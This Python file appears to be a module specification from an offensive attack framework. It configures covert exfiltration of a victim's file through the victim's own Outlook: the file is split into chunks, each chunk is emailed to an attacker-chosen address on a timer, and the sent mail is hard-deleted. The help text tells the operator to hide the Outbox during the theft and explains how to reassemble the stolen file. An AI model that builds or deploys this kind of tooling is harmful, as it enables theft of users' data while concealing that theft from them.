from lib.core.specmodule import SpecModule
from lib.modhandlers.generic import quotedstring,makeint
from lib.validators.generic import isint

class Spec(SpecModule):
    def __init__(self, templatepath, helpers):
        self.options = {}
        self.helpers = helpers
        self.help = """
        This module allows you exfiltrate files sending emails from the users Outlook.
        It will split the file into smaller pieces and send each piece as a separate email.
        The emails will be hard-deleted after sending so the user will never see the emails other than
        the status while sending in the bottom of Outlook. 

        !!REMEMBER TO RUN change_outlookfolder first to hide the Outbox!!
        !!REMEMBER TO RUN change_outloofolder after exfiltration is done to unhide the Outbox!!

        You specify the file you want to exfiltrate using the sourcefile option. 
        You specify the size per file you want in the splitsize option.
        You specify the receiver of the files in the recipient option.
        Join the files back togheter with the command: copy /b c:\\temp\\filesbasename* exfile.zip

        It uses Wscript.Shell
        - ExpandEnvironmentStrings

        It uses Scripting.FileSystemObject
        - GetFile
        - FileExists
        - CreateTextFile
        - DeleteFile

        It uses OutlookApplication
        - CreateItem(0)
        """
        self.entry = 'sendfile_mail'
        self.depends = []
        self.options['sourcefile'] = {
            "value": None,
            "required": True,
            "description": "Target path of file to split and exfiltrate",
            "handler": quotedstring
        }
        self.options['splitsize'] = {
            "value": "8",
            "required": True,
            "description": "Size in MB you want file to split into - default is 8MB",
            "handler": quotedstring,
            "validator": isint
        }
        self.options['recipient'] = {
            "value": None,
            "required": True,
            "description": "Email address you want to send the exfil files",
            "handler": quotedstring
        }
        self.options['send_interval_minutes'] = {
            "value": "8",
            "required": True,
            "description": "The interval between each time a file is sent - Default is 8 minutes",
            "handler": makeint,
            "validator": isint
        }
        super().__init__(templatepath)
